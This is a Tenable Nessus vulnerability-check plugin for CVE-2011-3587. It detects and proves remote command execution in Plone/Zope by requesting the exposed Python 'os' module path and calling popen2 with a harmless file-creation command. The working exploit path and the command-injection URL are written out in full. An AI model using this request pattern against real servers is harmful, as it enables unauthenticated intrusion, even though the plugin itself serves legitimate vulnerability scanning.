#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(57350);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/11/23 20:42:23 $");

  script_cve_id("CVE-2011-3587");
  script_bugtraq_id(49857);
  script_osvdb_id(76105);

  script_name(english:"Plone Request Parsing Remote Command Execution");
  script_summary(english:"Tries to execute a command.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote host allows arbitrary remote code
execution."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Plone hosted on the remote web server has a flaw that
allows arbitrary access to Python modules.  Using a specially crafted
URL, this can allow an unauthenticated, remote attacker the ability to
run arbitrary commands on the system through the Python 'os' module in
the context of the 'Zope/Plone' service."
  );
  script_set_attribute(attribute:"see_also", value:"http://plone.org/products/plone/security/advisories/20110928");
  script_set_attribute(attribute:"see_also", value:"http://plone.org/products/plone-hotfix/releases/20110928");
  # http://zope2.zope.org/news/security-vulnerability-announcement-cve-2011-3587
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b32a0de5");
  script_set_attribute(attribute:"see_also", value:"http://pypi.python.org/pypi/Products.PloneHotfix20110928/1.0");
  script_set_attribute(attribute:"solution", value:"Follow the instructions in the advisory to apply the hotfix.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Plone RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Plone and Zope XMLTools Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

script_set_attribute(attribute:"vuln_publication_date", value:"2011/09/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/09/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/12/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:plone:plone");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("plone_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/plone");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");
include("url_func.inc");

# Get details of Plone install.
port = get_http_port(default:80);

install = get_install_from_kb(appname:"plone", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# Verify the vuln exists (regardless of whether we can exploit it)
os_module = "p_/webdav/xmltools/minidom/xml/sax/saxutils/os";
url = dir + "/" + os_module;

res = http_send_recv3(
  method       : "GET",
  item         : url,
  port         : port,
  exit_on_fail : TRUE
);

if ("<module 'os' from '" >!< res[2])
  exit(0, "The Plone installation at " + build_url(port:port, qs:dir) + " is not affected.");

# it looks like only Unix Systems have popen2 compiled in,
# so this shouldn't work on Windows - but we can try anyways
file_name = SCRIPT_NAME + "-" + unixtime();
unix_command = urlencode(str:"touch /tmp/"+ file_name);
windows_command = urlencode(str:"echo " + SCRIPT_NAME + " > %windir%/temp/"+file_name);

verify_instructions =
'An attempt was made to create a temporary file on the remote host.\n'+
'You can verify its existence by checking for it at the following\n'+
'path';

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
  {
    commands = make_list(unix_command, windows_command);
    verify_instructions += 's:\n\n';
    verify_instructions += '  C:\\Windows\\temp\\' + file_name + '\n';
    verify_instructions += '  C:\\Winnt\\temp\\' + file_name + '\n';
  }
  else
  {
    commands = make_list(unix_command);
    verify_instructions += ':\n\n';
    verify_instructions += '  /tmp/' + file_name + '\n';
  }
}
else {
  commands = make_list(unix_command, windows_command);
  verify_instructions += 's (dependent on host operating system):\n\n';
  verify_instructions += '  /tmp/' + file_name + '\n';
  verify_instructions += '  C:\\Windows\\temp\\' + file_name + '\n';
  verify_instructions += '  C:\\Winnt\\temp\\' + file_name + '\n';
}

command_success = FALSE;
url_list = make_list();

foreach command (commands)
{
  url = dir + "/" + os_module + "/popen2?cmd=" + command;
  url_list = make_list(url_list, url);
  res = http_send_recv3(
    method       : "GET",
    item         : url,
    port         : port,
    exit_on_fail : TRUE
  );

  if ("<open file '<fdopen>'" >< res[2]) command_success = TRUE;
}

if (report_verbosity > 0)
{
  if (command_success)
  {
    report = '\nNessus was allowed to execute commands on the remote host.\n' +
    'The following requests were made:\n\n';
    foreach url (url_list)
      report += '  ' + build_url(qs:url, port:port) + '\n';
    report += '\n' + verify_instructions;
  }
  else
  {
    report = '\nNessus was able to determine that the vulnerability exists on the\n' +
    'remote host, but was not able to successfully exploit it.\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
